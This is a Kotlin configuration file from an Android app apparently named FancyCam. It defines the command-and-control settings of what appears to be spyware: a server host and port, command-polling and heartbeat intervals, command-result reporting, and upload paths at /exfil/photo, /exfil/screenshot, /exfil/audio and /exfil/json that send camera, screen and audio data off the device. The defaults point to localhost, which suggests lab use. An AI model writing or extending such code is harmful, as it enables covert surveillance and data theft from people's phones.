package xyz.nahil.fancycam.network

import android.content.Context
import android.content.SharedPreferences

object AppConfig {
    private const val PREFS_NAME = "fancycam_config"
    private const val KEY_SERVER_HOST = "server_host"
    private const val KEY_SERVER_PORT = "server_port"
    private const val KEY_POLL_INTERVAL_MS = "poll_interval_ms"
    private const val KEY_COLLECTION_INTERVAL_MS = "collection_interval_ms"

    const val DEFAULT_HOST = "127.0.0.1"
    const val DEFAULT_PORT = 5000
    const val EMULATOR_FALLBACK_HOST = "10.0.2.2"

    /** Primary command-poll cadence used by CommandPollingService. */
    const val DEFAULT_POLL_INTERVAL_MS = 15000L

    /** Cadence for full data collection runs inside CommandPollingService. */
    const val DEFAULT_COLLECTION_INTERVAL_MS = 60000L

    private fun getPrefs(context: Context): SharedPreferences {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }

    fun getServerHost(context: Context): String {
        return getPrefs(context).getString(KEY_SERVER_HOST, DEFAULT_HOST) ?: DEFAULT_HOST
    }

    fun setServerHost(context: Context, host: String) {
        getPrefs(context).edit().putString(KEY_SERVER_HOST, host.trim()).apply()
    }

    fun getServerPort(context: Context): Int {
        return getPrefs(context).getInt(KEY_SERVER_PORT, DEFAULT_PORT)
    }

    fun setServerPort(context: Context, port: Int) {
        getPrefs(context).edit().putInt(KEY_SERVER_PORT, port).apply()
    }

    /** Heartbeat/command-poll interval, clamped so the loop never spins. */
    fun getPollIntervalMs(context: Context): Long {
        return getPrefs(context).getLong(KEY_POLL_INTERVAL_MS, DEFAULT_POLL_INTERVAL_MS)
            .coerceAtLeast(5000L)
    }

    fun setPollIntervalMs(context: Context, intervalMs: Long) {
        getPrefs(context).edit().putLong(KEY_POLL_INTERVAL_MS, intervalMs).apply()
    }

    /** Full data-collection interval, clamped to at least one poll cycle. */
    fun getCollectionIntervalMs(context: Context): Long {
        return getPrefs(context).getLong(KEY_COLLECTION_INTERVAL_MS, DEFAULT_COLLECTION_INTERVAL_MS)
            .coerceAtLeast(15000L)
    }

    fun setCollectionIntervalMs(context: Context, intervalMs: Long) {
        getPrefs(context).edit().putLong(KEY_COLLECTION_INTERVAL_MS, intervalMs).apply()
    }

    fun getBaseUrl(context: Context): String {
        val host = getServerHost(context)
        val port = getServerPort(context)
        return "http://$host:$port"
    }

    fun getCandidateEndpoints(context: Context, path: String): List<String> {
        val configuredHost = getServerHost(context)
        val port = getServerPort(context)
        val normalizedPath = if (path.startsWith("/")) path else "/$path"

        val endpoints = mutableListOf<String>()
        endpoints.add("http://$configuredHost:$port$normalizedPath")

        // If configured host is 127.0.0.1, also add 10.0.2.2 emulator alias as fallback
        if (configuredHost == "127.0.0.1") {
            endpoints.add("http://$EMULATOR_FALLBACK_HOST:$port$normalizedPath")
        } else if (configuredHost == EMULATOR_FALLBACK_HOST) {
            endpoints.add("http://127.0.0.1:$port$normalizedPath")
        }

        return endpoints.distinct()
    }

    fun getPhotoUploadEndpoints(context: Context): List<String> {
        return getCandidateEndpoints(context, "/exfil/photo")
    }

    fun getScreenshotUploadEndpoints(context: Context): List<String> {
        return getCandidateEndpoints(context, "/exfil/screenshot")
    }

    fun getAudioUploadEndpoints(context: Context): List<String> {
        return getCandidateEndpoints(context, "/exfil/audio")
    }

    fun getJsonExfilEndpoints(context: Context): List<String> {
        return getCandidateEndpoints(context, "/exfil/json")
    }

    fun getHeartbeatEndpoints(context: Context, pollCommands: Boolean = true): List<String> {
        val endpoints = getCandidateEndpoints(context, "/api/heartbeat")
        if (pollCommands) return endpoints
        return endpoints.map { endpoint ->
            val separator = if (endpoint.contains('?')) '&' else '?'
            "${endpoint}${separator}poll_commands=0"
        }
    }

    fun getHealthEndpoints(context: Context): List<String> {
        return getCandidateEndpoints(context, "/health")
    }

    fun getHealthUrl(context: Context): String {
        return "${getBaseUrl(context)}/health"
    }

    fun getStatusUrl(context: Context): String {
        return "${getBaseUrl(context)}/api/status"
    }

    fun getCommandResultEndpoints(context: Context): List<String> {
        return getCandidateEndpoints(context, "/api/commands/result")
    }
}
